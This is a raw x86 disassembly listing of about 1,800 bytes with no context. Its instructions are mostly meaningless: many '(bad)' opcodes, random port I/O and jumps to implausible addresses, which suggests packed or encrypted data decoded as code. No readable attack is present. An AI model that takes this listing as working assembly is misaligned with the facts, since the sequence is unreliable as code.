  4245ca:	mov    eax,ds:0x54f72661
  4245cf:	or     ebp,edi
  4245d1:	leave  
  4245d2:	fldcw  WORD PTR [edi+0x2fcf7ca]
  4245d8:	mov    dl,0x88
  4245da:	or     eax,0x619ac1c7
  4245df:	out    0xf1,eax
  4245e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4245e2:	sbb    al,0x5b
  4245e4:	add    DWORD PTR [edx-0x7a],ebp
  4245e7:	ins    BYTE PTR es:[edi],dx
  4245e8:	and    cl,BYTE PTR [ebx]
  4245ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4245eb:	ror    DWORD PTR [esi+edx*2],1
  4245ee:	addr16 stc 
  4245f0:	(bad)  
  4245f1:	jmp    DWORD PTR [edx]
  4245f3:	dec    ebp
  4245f4:	cmc    
  4245f5:	out    0xca,eax
  4245f7:	fsubr  st(1),st
  4245f9:	dec    esp
  4245fa:	(bad)  
  4245fc:	rcl    DWORD PTR [ebp+0x5097ae39],cl
  424602:	sbb    eax,0xb9950aef
  424607:	mov    al,0x62
  424609:	pop    edx
  42460a:	push   eax
  42460b:	jae    0x424680
  42460d:	adc    esi,ecx
  42460f:	aaa    
  424610:	ins    DWORD PTR es:[edi],dx
  424611:	loop   0x4245c0
  424613:	mov    ch,0xf6
  424615:	fimul  WORD PTR ds:0x3bb3191f
  42461b:	sub    dh,BYTE PTR [eax]
  42461d:	xchg   ecx,eax
  42461e:	jbe    0x4245be
  424620:	fcmovnbe st,st(1)
  424622:	mov    ebx,0x5a83
	...
  42462f:	add    BYTE PTR [eax],al
  424631:	imul   ecx,DWORD PTR [edi+0x7dee7c8a],0xffffffff
  424638:	lahf   
  424639:	push   esi
  42463a:	jl     0x4245fd
  42463c:	dec    edi
  42463d:	mov    bl,0x3b
  42463f:	mov    ch,0x3f
  424641:	cmc    
  424642:	mov    ebp,0x3ac0001
  424647:	add    BYTE PTR [eax],al
  424649:	mov    ds:0xc6065cdc,al
  42464e:	shl    ch,cl
  424650:	out    0x7,eax
  424652:	in     al,0xee
  424654:	clc    
  424655:	push   0xbbcebb27
  42465a:	lods   al,BYTE PTR ds:[esi]
  42465b:	cmc    
  42465c:	sbb    BYTE PTR [edx+0xe312adb],bl
  424662:	xor    dh,ah
  424664:	call   0xfedb:0x4773c148
  42466b:	dec    ecx
  42466c:	mov    ebx,0xe5bae5b8
  424671:	fild   WORD PTR [edi-0x6]
  424674:	mov    ch,0x44
  424676:	dec    ecx
  424677:	push   edi
  424678:	lahf   
  424679:	jecxz  0x424682
  42467b:	rol    DWORD PTR [eax-0x31e1dce6],1
  424681:	(bad)  
  424683:	aaa    
  424684:	int3   
  424685:	mov    ebx,0x9a55d9f6
  42468a:	jg     0x4246f5
  42468c:	push   edx
  42468d:	test   ebx,esi
  42468f:	pusha  
  424690:	jno    0x4246f0
  424692:	jl     0x4246f7
  424694:	inc    edx
  424695:	(bad)  
  424696:	push   edx
  424697:	mov    ebp,0x40e508e2
  42469c:	out    dx,eax
  42469d:	sub    al,0x6c
  42469f:	addr16 dec esi
  4246a1:	jmp    0x4246a0
  4246a3:	adc    ebp,DWORD PTR [eax]
  4246a5:	scas   al,BYTE PTR es:[edi]
  4246a6:	pusha  
  4246a7:	or     bh,bl
  4246a9:	adc    bh,cl
  4246ab:	stos   BYTE PTR es:[edi],al
  4246ac:	lods   al,BYTE PTR ds:[esi]
  4246ad:	jbe    0x4246ff
  4246af:	in     al,dx
  4246b0:	jg     0x42463d
  4246b2:	ins    DWORD PTR es:[edi],dx
  4246b3:	xlat   BYTE PTR ds:[ebx]
  4246b4:	mov    bl,0xcd
  4246b6:	jmp    0xd289f2ef
  4246bb:	jp     0x424665
  4246bd:	jb     0x42469f
  4246bf:	dec    eax
  4246c0:	inc    edx
  4246c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4246c2:	add    al,0xa0
  4246c4:	repz sub DWORD PTR [ebp-0x7062f006],ebp
  4246cb:	mov    ds:0x4e5e389c,eax
  4246d0:	mov    ah,0xc1
  4246d2:	clc    
  4246d3:	or     eax,DWORD PTR [ebx]
  4246d5:	loop   0x42466b
  4246d7:	dec    eax
  4246d8:	add    al,0x5a
  4246da:	pushf  
  4246db:	mov    dh,0xb1
  4246dd:	nop    DWORD PTR [ebx-0x70]
  4246e1:	xlat   BYTE PTR ds:[ebx]
  4246e2:	in     eax,0x21
  4246e4:	xor    BYTE PTR [edi+eiz*1],al
  4246e7:	mov    ebx,0xe5dd3faf
  4246ec:	xor    al,0x98
  4246ee:	jno    0x4246bc
  4246f0:	fist   DWORD PTR [eax+0xe]
  4246f3:	push   ds
  4246f4:	dec    ebp
  4246f5:	(bad)  
  4246f7:	add    BYTE PTR [ecx],dh
  4246f9:	test   DWORD PTR [ebx+0x36d3872a],esp
  4246ff:	and    esp,eax
  424701:	push   0x7d
  424703:	xor    al,0x49
  424705:	or     dh,BYTE PTR [ecx+0x5292fd81]
  42470b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42470c:	icebp  
  42470d:	or     DWORD PTR [edi+esi*2-0x4b3307c0],0x2ee3af2e
  424718:	test   BYTE PTR [ecx-0x7e],dh
  42471b:	jns    0x424706
  42471d:	push   es
  42471e:	enter  0x5953,0x8b
  424722:	imul   esp,DWORD PTR [esp+ebx*4+0x167b0f0],0xffffff92
  42472a:	retf   
  42472b:	xchg   edx,eax
  42472c:	lods   al,BYTE PTR ds:[esi]
  42472d:	push   ds
  42472e:	out    dx,eax
  42472f:	leave  
  424730:	push   eax
  424731:	xchg   ebx,eax
  424732:	nop
  424733:	push   ecx
  424734:	ins    BYTE PTR es:[edi],dx
  424735:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424736:	inc    ebp
  424737:	mov    ebp,0x6dd7386e
  42473c:	add    BYTE PTR [ebx-0xf],cl
  42473f:	jg     0x4246de
  424741:	popa   
  424742:	dec    ecx
  424743:	xchg   ecx,eax
  424744:	and    BYTE PTR [edi],ah
  424746:	or     ah,BYTE PTR [esi+ebx*4+0x7e]
  42474a:	inc    edx
  42474b:	jne    0x424724
  42474d:	xor    bl,BYTE PTR [ebx+0x7a]
  424750:	mov    ecx,0x828320dc
  424755:	stc    
  424756:	mov    bh,0xb5
  424758:	hlt    
  424759:	mov    es,WORD PTR [ebp-0x68172418]
  42475f:	hlt    
  424760:	and    ah,cl
  424762:	and    dh,BYTE PTR [eax+eax*2+0x6ed3a005]
  424769:	sbb    BYTE PTR [ecx+eax*4],dl
  42476c:	push   esp
  42476d:	add    DWORD PTR [esi+ebp*2+0x47],edx
  424771:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  424773:	mov    eax,0x2aca97
  424778:	adc    eax,esi
  42477a:	jp     0x424778
  42477c:	mov    eax,0x4c0cfec7
  424781:	fwait
  424782:	add    BYTE PTR [eax+0x32],0x7a
  424786:	lods   eax,DWORD PTR ds:[esi]
  424787:	test   BYTE PTR [eax+0x7014f319],bh
  42478d:	push   ecx
  42478e:	inc    esp
  42478f:	stos   BYTE PTR es:[edi],al
  424790:	cld    
  424791:	push   ds
  424792:	sbb    BYTE PTR [edi],dl
  424794:	push   edx
  424795:	or     BYTE PTR [esi],ch
  424797:	push   eax
  424798:	sub    BYTE PTR [edx+eiz*8],dh
  42479b:	mov    ebx,0x38291149
  4247a0:	sbb    BYTE PTR [edx],cl
  4247a2:	in     al,dx
  4247a3:	pop    edx
  4247a4:	imul   edx,ecx,0x19a4ffff
  4247aa:	fdivr  st,st(5)
  4247ac:	std    
  4247ad:	lods   al,BYTE PTR ds:[esi]
  4247ae:	out    0x52,al
  4247b0:	dec    esi
  4247b1:	mov    eax,0x421c3767
  4247b6:	push   edi
  4247b7:	mov    BYTE PTR ds:0x56591c60,ch
  4247bd:	clc    
  4247be:	cmp    eax,0x21794764
  4247c3:	fwait
  4247c4:	imul   esp,DWORD PTR [edi+0x5f7f8cf5],0x25
  4247cb:	int3   
  4247cc:	inc    edx
  4247cd:	or     BYTE PTR [edi+eiz*1-0x4b],ah
  4247d1:	mov    ebx,0x3a7404b3
  4247d6:	sbb    eax,0x2acf2585
  4247db:	jge    0x42480d
  4247dd:	cwde   
  4247de:	sub    eax,0x52f9d937
  4247e3:	das    
  4247e4:	push   edx
  4247e5:	fidivr DWORD PTR [edx-0x62d3c87b]
  4247eb:	mov    ebx,0xb83d6954
  4247f0:	cmp    eax,0xa1de1f9a
  4247f5:	rol    DWORD PTR [eax+0x3a49c974],cl
  4247fb:	mov    DWORD PTR [edi-0x160f6419],esi
  424801:	shl    BYTE PTR [ebp+0x5eea34d7],0xe1
  424808:	sbb    al,BYTE PTR fs:[edi+0x60713aeb]
  42480f:	dec    ebx
  424810:	sub    BYTE PTR [esi],dh
  424812:	jge    0x424836
  424814:	xchg   BYTE PTR [eax-0x22636c65],ah
  42481a:	pop    ecx
  42481b:	out    dx,al
  42481c:	stos   BYTE PTR es:[edi],al
  42481d:	inc    esp
  42481e:	daa    
  42481f:	pushf  
  424820:	aad    0x38
  424822:	icebp  
  424823:	out    dx,eax
  424824:	jg     0x4247ff
  424826:	mov    al,dl
  424828:	mov    dl,0x3e
  42482a:	adc    DWORD PTR [ebp-0x1a],eax
  42482d:	sub    eax,0xbf29daac
  424832:	gs and eax,0x1bc88cd2
  424838:	pop    ecx
  424839:	scas   al,BYTE PTR es:[edi]
  42483a:	and    ah,BYTE PTR [edx+ebx*4-0xc]
  42483e:	in     eax,dx
  42483f:	aas    
  424840:	xor    dh,dl
  424842:	push   ebp
  424843:	adc    al,0x2e
  424845:	mov    ebp,ebp
  424847:	push   ebp
  424848:	fisubr DWORD PTR ds:0xf648a1fb
  42484e:	adc    eax,DWORD PTR [edi-0x15]
  424851:	int3   
  424852:	je     0x424860
  424854:	sub    DWORD PTR [ebp-0x55],ecx
  424857:	repz sbb ah,BYTE PTR [eax+0x29]
  42485b:	dec    esp
  42485c:	mov    bh,0xcb
  42485e:	outs   dx,DWORD PTR ds:[esi]
  42485f:	inc    esp
  424860:	pop    eax
  424861:	mov    eax,0x39e7c6e7
  424866:	xor    ecx,esp
  424868:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424869:	(bad)  
  42486a:	aam    0x63
  42486c:	push   0x76b4a745
  424871:	fld    DWORD PTR [edi]
  424873:	inc    ecx
  424874:	ds cmp eax,0xac6fa34a
  42487a:	mov    al,ds:0xc5e28a5c
  42487f:	mov    eax,0xf856353d
  424884:	daa    
  424885:	add    dh,BYTE PTR [ebx]
  424887:	add    ebp,0x99811940
  42488d:	icebp  
  42488e:	lahf   
  42488f:	jns    0x4248d4
  424891:	jecxz  0x42483c
  424893:	pushf  
  424894:	nop
  424895:	mov    dh,0x44
  424897:	add    eax,0x945b9537
  42489c:	mov    ds,WORD PTR [eax+eiz*8-0x40]
  4248a0:	jns    0x42488c
  4248a2:	fld    QWORD PTR ds:0xc585df4
  4248a8:	outs   dx,DWORD PTR ds:[esi]
  4248a9:	xchg   esp,eax
  4248aa:	mov    edx,0x51cff415
  4248af:	lock mov gs,WORD PTR [esi+0x7f]
  4248b3:	cmp    dl,BYTE PTR [edx+0x25]
  4248b6:	and    al,0x55
  4248b8:	add    al,dl
  4248ba:	or     eax,0x42693808
  4248bf:	add    edi,DWORD PTR [eax-0x2d]
  4248c2:	out    dx,eax
  4248c3:	outs   dx,BYTE PTR ds:[esi]
  4248c4:	push   esi
  4248c5:	aas    
  4248c6:	aas    
  4248c7:	std    
  4248c8:	push   es
  4248c9:	mov    ch,0xf9
  4248cb:	ss jge 0x424872
  4248ce:	sbb    ah,BYTE PTR es:[esi-0xf81f52a]
  4248d5:	vcmppd ymm5,ymm6,YMMWORD PTR [edi+0x55d3e03],0x85
  4248de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4248df:	xchg   edi,eax
  4248e0:	test   DWORD PTR [esi-0x69],ebx
  4248e3:	add    ecx,DWORD PTR [esi-0x40]
  4248e6:	cmp    eax,0xf67ded93
  4248eb:	and    DWORD PTR [ebx-0x63],0xd85c4a50
  4248f2:	cmp    eax,eax
  4248f4:	jle    0x424941
  4248f6:	cwde   
  4248f7:	xchg   ecx,eax
  4248f8:	cdq    
  4248f9:	dec    eax
  4248fa:	inc    ecx
  4248fb:	lock stos DWORD PTR es:[edi],eax
  4248fd:	fwait
  4248fe:	push   edi
  4248ff:	imul   edi
  424901:	sar    BYTE PTR [ebp-0x35],cl
  424904:	or     esp,DWORD PTR [ecx]
  424906:	div    BYTE PTR [eax-0x70]
  424909:	pop    ds
  42490a:	test   BYTE PTR [esi+ebx*8+0x65281e54],dl
  424911:	xor    edx,DWORD PTR [esi]
  424913:	mov    ebp,ebx
  424915:	mov    ebx,0xc2f765cf
  42491a:	loope  0x4248cc
  42491c:	bound  ebp,QWORD PTR [esp+esi*2-0x61e6ff3e]
  424923:	fiadd  DWORD PTR [ecx-0x40]
  424926:	daa    
  424927:	dec    edx
  424928:	cmp    al,0x52
  42492a:	lahf   
  42492b:	dec    edx
  42492c:	out    dx,al
  42492d:	imul   esp,DWORD PTR [esi-0x74],0x65b560e6
  424934:	xor    DWORD PTR [esi],esi
  424936:	pop    ebp
  424937:	clc    
  424938:	sbb    eax,DWORD PTR [edx-0x3b]
  42493b:	or     eax,0xe3585d5
  424940:	cld    
  424941:	xor    BYTE PTR [ecx+eax*4-0x47afe0a6],0x78
  424949:	xchg   esp,eax
  42494a:	mov    esp,0xbd79a9df
  42494f:	add    al,0xe1
  424951:	xchg   ebx,eax
  424952:	dec    edx
  424953:	repz and eax,0x3d6aaec9
  424959:	mov    ch,0x4e
  42495b:	jmp    0x891f1ce4
  424960:	adc    al,0x4f
  424962:	cmp    eax,0x783b9ee5
  424967:	test   BYTE PTR [esi+0x69],al
  42496a:	fistp  DWORD PTR [ecx]
  42496c:	push   ecx
  42496d:	mov    DWORD PTR [ecx+ecx*8+0x406aaa92],eax
  424974:	sub    BYTE PTR ds:0xc39ca56d,ch
  42497a:	dec    eax
  42497b:	inc    ebx
  42497c:	je     0x4248ff
  42497e:	adc    eax,0xf368737
  424983:	mov    ebp,DWORD PTR [bx+0x4b]
  424987:	pushf  
  424988:	cmp    DWORD PTR gs:[eax-0x12601e4f],0xffffffc3
  424990:	mov    edx,0x2f9499d0
  424995:	push   cs
  424996:	(bad)  
  424997:	cwde   
  424998:	inc    eax
  424999:	and    al,0x41
  42499b:	(bad)  
  42499d:	mov    bh,0x29
  42499f:	add    BYTE PTR [edx+0x49b0cfb7],0xde
  4249a6:	addr16 das 
  4249a8:	jge    0x4249b7
  4249aa:	sbb    ah,al
  4249ac:	in     eax,0xa0
  4249ae:	imul   esi,DWORD PTR [ebx-0x36],0xfffffffb
  4249b2:	(bad)  
  4249b3:	or     al,BYTE PTR ds:0x1fce8652
  4249b9:	mov    dh,0x85
  4249bb:	cmp    eax,0x5b194d07
  4249c0:	retf   0xe2ce
  4249c3:	mov    esp,0xd207f71a
  4249c8:	fadd   QWORD PTR [edx-0x59]
  4249cb:	jmp    0x867db8a2
  4249d0:	dec    edi
  4249d1:	or     BYTE PTR [eax+edi*8-0x27],cl
  4249d5:	adc    esp,DWORD PTR [esi+0x191e530a]
  4249db:	lods   eax,DWORD PTR ds:[esi]
  4249dc:	call   0xf0c2:0xf49a4baa
  4249e3:	push   ss
  4249e4:	fiadd  DWORD PTR [ebx+0x78]
  4249e7:	jbe    0xa8c09cf
  4249ed:	jno    0x4249b8
  4249ef:	fs jge 0x424a6d
  4249f2:	test   DWORD PTR [edx+edx*1+0x0],ebp
	...
  4249fe:	add    BYTE PTR [eax],al
  424a00:	add    BYTE PTR [ebp+0x6a],dl
  424a03:	out    0xb3,al
  424a05:	(bad)  
  424a06:	mov    edi,0x7b2ee55
  424a0b:	cmp    BYTE PTR [eax],dh
  424a0d:	pop    ecx
  424a0e:	fst    st(3)
  424a10:	or     eax,0x1c1a1
  424a15:	lods   al,BYTE PTR ds:[esi]
  424a16:	add    eax,DWORD PTR [eax]
  424a18:	add    BYTE PTR [eax+0x200955e0],al
  424a1e:	rcl    BYTE PTR [ebx],1
  424a20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424a21:	jno    0x424a59
  424a23:	xchg   edx,eax
  424a24:	mov    esp,?
  424a26:	(bad)  
  424a27:	push   ds
  424a28:	pop    es
  424a29:	aam    0x69
  424a2b:	cmc    
  424a2c:	stos   DWORD PTR es:[edi],eax
  424a2d:	xchg   ebp,eax
  424a2e:	mov    al,ds:0xacc1e4a6
  424a33:	adc    DWORD PTR [esi-0x27],edx
  424a36:	mov    ecx,0xfd418fea
  424a3b:	aaa    
  424a3c:	imul   eax,DWORD PTR [ebx+ecx*2],0x7083dce0
  424a43:	mov    cl,0x49
  424a45:	das    
  424a46:	outs   dx,BYTE PTR ds:[esi]
  424a47:	push   es
  424a48:	jge    0x424a39
  424a4a:	mov    ebp,0x7b050275
  424a4f:	enter  0x35f9,0xb5
  424a53:	add    BYTE PTR [ebx-0x20],dl
  424a56:	and    dh,dh
  424a58:	in     eax,dx
  424a59:	add    DWORD PTR [edi+0x1b],eax
  424a5c:	xchg   DWORD PTR [ebp*8+0x30b23395],edx
  424a63:	and    eax,DWORD PTR [eax-0x31]
  424a66:	sar    BYTE PTR [ebx],1
  424a68:	jmp    0x64b9a598
  424a6d:	ds sub al,0x8e
  424a70:	(bad)  
  424a71:	sti    
  424a72:	jle    0x424aeb
  424a74:	jmp    FWORD PTR [edx-0x1be0951b]
  424a7a:	mov    ds:0x20aa89aa,eax
  424a7f:	fcmovne st,st(3)
  424a81:	not    DWORD PTR [eax-0x7dfffd39]
  424a87:	test   eax,0x2a7965f8
  424a8c:	and    eax,0x7a163e72
  424a91:	icebp  
  424a92:	ins    DWORD PTR es:[edi],dx
  424a93:	inc    BYTE PTR [esi]
  424a95:	stos   BYTE PTR es:[edi],al
  424a96:	inc    esp
  424a97:	in     al,dx
  424a98:	pop    ebx
  424a99:	nop
  424a9a:	sub    edx,esp
  424a9c:	mov    ch,0xd9
  424a9e:	adc    eax,0x9f6f1593
  424aa3:	cwde   
  424aa4:	sub    ah,BYTE PTR [ebx]
  424aa6:	push   esp
  424aa7:	xor    eax,0xa0930475
  424aac:	mov    dh,0x69
  424aae:	push   eax
  424aaf:	dec    esi
  424ab0:	push   0x4edfeafb
  424ab5:	ret    
  424ab6:	sbb    ecx,DWORD PTR [ecx]
  424ab8:	sub    BYTE PTR [ecx-0xb],bh
  424abb:	add    ah,BYTE PTR [esi-0x49aad9d2]
  424ac1:	repnz hlt 
  424ac3:	mov    ecx,0xa535af42
  424ac8:	xlat   BYTE PTR ds:[ebx]
  424ac9:	lahf   
  424aca:	repnz xlat BYTE PTR ds:[ebx]
  424acc:	mov    ah,0x34
  424ace:	out    0x9a,al
  424ad0:	mov    WORD PTR [eax],?
  424ad2:	inc    esi
  424ad3:	push   edx
  424ad4:	pop    edi
  424ad5:	mov    DWORD PTR [edx+0x78],eax
  424ad8:	in     eax,0x3c
  424ada:	push   ss
  424adb:	push   0x72
  424add:	fstp   DWORD PTR [ebp+0x2c]
  424ae0:	or     eax,0xc063b92e
  424ae5:	shr    BYTE PTR [ebx],1
  424ae7:	and    BYTE PTR [bx+si+0x45fc],dl
  424aec:	push   DWORD PTR [esi+0x4be677db]
  424af2:	(bad)  
  424af3:	mov    dh,0x79
  424af5:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424af7:	int3   
  424af8:	idiv   dh
  424afa:	push   esp
  424afb:	das    
  424afc:	jae    0x424b07
  424afe:	xchg   edx,eax
  424aff:	push   es
  424b00:	jb     0x424b36
  424b02:	call   0xd36c:0xd41c60a0
  424b09:	pop    edx
  424b0a:	cs (bad) 
  424b0c:	lahf   
  424b0d:	ds ins DWORD PTR es:[edi],dx
  424b0f:	pop    es
  424b10:	lods   al,BYTE PTR ds:[esi]
  424b11:	out    0x5e,eax
  424b13:	aam    0x44
  424b15:	das    
  424b16:	cli    
  424b17:	mov    ecx,0x5adda7da
  424b1c:	adc    dh,BYTE PTR [edx]
  424b1e:	jno    0x424b6e
  424b20:	sub    DWORD PTR [edi+edx*8],edi
  424b23:	bound  ebx,QWORD PTR [edi]
  424b25:	imul   ebx,DWORD PTR [ecx+eax*8-0x34],0x3c57978b
  424b2d:	add    BYTE PTR [ecx],0x18
  424b30:	sub    DWORD PTR [eax-0x80],edx
  424b33:	sbb    BYTE PTR [ecx],bl
  424b35:	xchg   ecx,eax
  424b36:	ja     0x424ab8
  424b38:	cmp    ebx,ecx
  424b3a:	in     al,dx
  424b3b:	or     dl,BYTE PTR [ebp-0xbe472d1]
  424b41:	xchg   esi,eax
  424b42:	and    DWORD PTR [edi],edi
  424b44:	inc    ecx
  424b45:	xchg   ebp,eax
  424b46:	inc    DWORD PTR [esi]
  424b48:	add    dh,BYTE PTR [eax]
  424b4a:	dec    eax
  424b4b:	adc    BYTE PTR [edx-0x21705d0c],ch
  424b51:	or     cl,BYTE PTR [eax-0x3351fa4f]
  424b57:	dec    ecx
  424b58:	sti    
  424b59:	(bad)  
  424b5a:	cmp    esi,DWORD PTR ds:0xef78e5e9
  424b60:	jmp    0x8f5485a9
  424b65:	adc    DWORD PTR [eax+0x28],0x50f00758
  424b6c:	dec    eax
  424b6d:	(bad)  
  424b6e:	(bad)  
  424b6f:	out    dx,eax
  424b70:	pop    es
  424b71:	jmp    0x2bf3adf3
  424b76:	jnp    0x424b43
  424b78:	sbb    edi,DWORD PTR [esi+esi*1-0x7c]
  424b7c:	pop    ds
  424b7d:	or     dl,BYTE PTR [esp+ecx*1]
  424b80:	push   ecx
  424b81:	sub    edi,DWORD PTR es:[edi+ebp*4]
  424b85:	sub    ebp,ebx
  424b87:	xlat   BYTE PTR ds:[ebx]
  424b88:	inc    edx
  424b89:	popa   
  424b8a:	sub    BYTE PTR ds:0x909f3d45,bl
  424b90:	inc    eax
  424b91:	loope  0x424b64
  424b93:	js     0x424c12
  424b95:	test   edx,esp
  424b97:	mov    edx,esp
  424b99:	push   cs
  424b9a:	mov    bh,0x7e
  424b9c:	lock dec edx
  424b9e:	gs lock push ebp
  424ba1:	and    dh,ch
  424ba3:	lahf   
  424ba4:	ror    DWORD PTR [edx-0x1e8deb02],cl
  424baa:	mov    eax,ds:0x15210159
  424baf:	ss int 0x59
  424bb2:	inc    ebp
  424bb3:	outs   dx,BYTE PTR ds:[esi]
  424bb4:	ds cmp al,0xc6
  424bb7:	xchg   esi,eax
  424bb8:	inc    ecx
  424bb9:	dec    ebp
  424bba:	add    edi,ebx
  424bbc:	sbb    eax,0xf0444d99
  424bc1:	push   es
  424bc2:	mov    ?,eax
  424bc4:	aas    
  424bc5:	mov    esp,0x48c25411
  424bca:	jb     0x424c22
  424bcc:	jb     0x424bef
  424bce:	stos   BYTE PTR es:[edi],al
  424bcf:	push   ebx
  424bd0:	fidiv  DWORD PTR [edx]
  424bd2:	sbb    al,0x69
  424bd4:	inc    esp
  424bd5:	mov    ch,0x5
  424bd7:	sbb    ebp,DWORD PTR fs:[ecx]
  424bda:	mov    ebx,0xc453278c
  424bdf:	mov    edx,0x6b86c7fa
  424be4:	pop    es
  424be5:	xchg   edi,eax
  424be6:	bound  ebp,QWORD PTR ds:0xbb742864
  424bec:	test   eax,0x6f205131
  424bf1:	cmp    ebx,esi
  424bf3:	or     BYTE PTR [esi+0x51],0x16
  424bf7:	gs cli 
  424bf9:	lahf   
  424bfa:	push   ds
  424bfb:	in     eax,0x73
  424bfd:	in     al,dx
  424bfe:	sub    esp,edi
  424c00:	adc    al,0x53
  424c02:	cs aaa 
  424c04:	dec    ecx
  424c05:	push   ecx
  424c06:	xchg   ebx,eax
  424c07:	adc    edi,esi
  424c09:	ja     0x424b94
  424c0b:	dec    ebx
  424c0c:	out    dx,al
  424c0d:	jnp    0x424beb
  424c0f:	fwait
  424c10:	sub    ah,ah
  424c12:	int    0xe5
  424c14:	(bad)  
  424c15:	mov    edx,0xc1fc5d46
  424c1a:	dec    edx
  424c1b:	push   esi
  424c1c:	mov    esp,0x8c84ace5
  424c21:	loope  0x424bc4
  424c23:	call   0xa3f00ae0
  424c28:	push   ebp
  424c29:	stos   BYTE PTR es:[edi],al
  424c2a:	pop    eax
  424c2b:	in     al,0xa2
  424c2d:	cmp    cl,BYTE PTR [ebx-0x69]
  424c30:	loop   0x424bf7
  424c32:	cmp    esi,edi
  424c34:	dec    ecx
  424c35:	sub    BYTE PTR [eax*8-0x68271be5],bl
  424c3c:	push   es
  424c3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424c3e:	(bad)  
  424c3f:	stc    
  424c40:	xchg   BYTE PTR [ecx+ebp*2-0x508c509b],al
  424c47:	xchg   edx,eax
  424c48:	dec    eax
  424c49:	xor    BYTE PTR [ebp+0x65dc878f],0xe0
  424c50:	bnd jo 0x424c8a
  424c53:	out    dx,eax
  424c54:	adc    BYTE PTR [ebx+0x3],ah
  424c57:	jle    0x69cf193d
  424c5d:	int    0x26
  424c5f:	pop    ds
  424c60:	pusha  
  424c61:	push   esp
  424c62:	dec    edi
  424c63:	sbb    BYTE PTR [ebp+edx*1+0x56],dh
  424c67:	mov    esi,0x1a80e185
  424c6c:	popa   
  424c6d:	enter  0xdaf5,0x7b
  424c71:	or     eax,0x9d088a75
  424c76:	pop    DWORD PTR [ebp+0x11]
  424c79:	fcomi  st,st(5)
  424c7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c7c:	push   esi
  424c7d:	or     al,0xe4
  424c7f:	push   esp
  424c80:	cmp    ch,BYTE PTR ds:0xfeb2df9a
  424c86:	sahf   
  424c87:	test   DWORD PTR [ecx+0x48],eax
  424c8a:	sub    esp,ecx
  424c8c:	int3   
  424c8d:	xor    al,0x4b
  424c8f:	pop    ecx
  424c90:	retf   
  424c91:	and    BYTE PTR [ebx+0x13],dh
  424c94:	(bad)  
  424c95:	in     al,dx
  424c96:	mov    ds:0x3659c5ef,eax
  424c9b:	sub    edx,DWORD PTR [ecx-0x29946e8c]
  424ca1:	(bad)  
  424ca3:	call   0xee4b5cfa
  424ca8:	cmp    bl,BYTE PTR [eax]
  424caa:	mov    ds:0x2f7fb4ed,eax
  424caf:	out    0x32,eax
  424cb1:	in     al,dx
  424cb2:	js     0x424c9c
  424cb4:	call   0x5671b5ce
  424cb9:	je     0x424c90
  424cbb:	pop    edi
  424cbc:	cmp    BYTE PTR [eax-0x5a],dh
  424cbf:	inc    esp
  424cc0:	cmp    DWORD PTR [esi],0xdfe79f4e
  424cc6:	clc    
  424cc7:	out    dx,eax
  424cc8:	bound  ecx,QWORD PTR [ebp+0x7229d3b8]
  424cce:	iret   
  424ccf:	in     eax,dx
  424cd0:	dec    ecx
  424cd1:	and    DWORD PTR [eax+esi*2-0x5b],edx
  424cd5:	mov    BYTE PTR [ebp+0x14],bh
  424cd8:	jl     0x424c64
  424cda:	mov    cl,0xb5
  424cdc:	jo     0x424d56
  424cde:	pop    edx
  424cdf:	sub    al,0x72
  424ce1:	iret   
  424ce2:	test   al,0x1c
  424ce4:	fcomi  st,st(3)
  424ce6:	xor    BYTE PTR [esi+0x5623e8f7],ch
  424cec:	xor    edx,DWORD PTR [eax]
  424cee:	dec    ecx
  424cef:	imul   edi,DWORD PTR [ecx+0x2d],0x6d
  424cf3:	test   DWORD PTR [edi+0x77ac8646],edx
  424cf9:	lock aas 
  424cfb:	sti    
  424cfc:	xchg   esi,eax
  424cfd:	lea    esi,[esi]
  424cff:	or     BYTE PTR [edx+esi*8+0x6d],dl
  424d03:	rol    al,cl
  424d05:	xchg   esp,eax
  424d06:	retf   0xfc51
  424d09:	pop    ebx
  424d0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424d0b:	add    edi,DWORD PTR [ecx-0x4e28599b]
  424d11:	inc    DWORD PTR [esp+eiz*2-0x4f707733]
  424d18:	fidivr WORD PTR [ebx-0x13]
  424d1b:	jecxz  0x424d5f
  424d1d:	in     eax,dx
  424d1e:	pop    ss
  424d1f:	and    eax,0xc1118933
  424d24:	es fwait
  424d26:	sbb    eax,0x599aa399
  424d2b:	mov    edx,0x9e2dfa4e
  424d30:	push   edi
  424d31:	rcl    BYTE PTR [esi],1
  424d33:	gs ret 
  424d35:	push   0x3c
  424d37:	rol    BYTE PTR [ebx+0xe26d38e],0xb1
  424d3e:	mov    ch,0x9
  424d40:	jg     0x424d0a
  424d42:	sub    BYTE PTR [eax-0x3d949fd0],ah
  424d48:	jmp    0x9d18364c
  424d4d:	sbb    al,0xa3
  424d4f:	imul   esi,DWORD PTR [ecx],0x2e
  424d52:	jns    0x424d4c
  424d54:	pop    esp
  424d55:	lea    ebx,[esi-0x55]
  424d58:	test   eax,0xba42cfac
  424d5d:	xor    eax,0xada744e1
  424d62:	pop    eax
  424d63:	out    dx,al
  424d64:	dec    edi
  424d65:	mov    DWORD PTR [ebx-0x15f7b9f8],0xd038119f
  424d6f:	inc    ebx
  424d70:	stc    
  424d71:	and    eax,0x7782f9ec
  424d76:	(bad)  
  424d78:	icebp  
  424d79:	cmp    al,0x1c
  424d7b:	cwde   
  424d7c:	xchg   DWORD PTR [ebx-0x61c536bb],eax
  424d82:	idiv   ebx
  424d84:	jle    0x424df5
  424d86:	popf   
  424d87:	mov    ebp,0x912739e2
  424d8c:	dec    edx
  424d8d:	mov    dh,0x84
  424d8f:	xchg   BYTE PTR fs:[eax],ah
  424d92:	retf   0x787d
  424d95:	xchg   eax,edi
  424d97:	divps  xmm4,xmm3
  424d9a:	xor    eax,0xa22017cc
  424d9f:	ret    0x7c31
  424da2:	dec    edx
  424da3:	xchg   ecx,eax
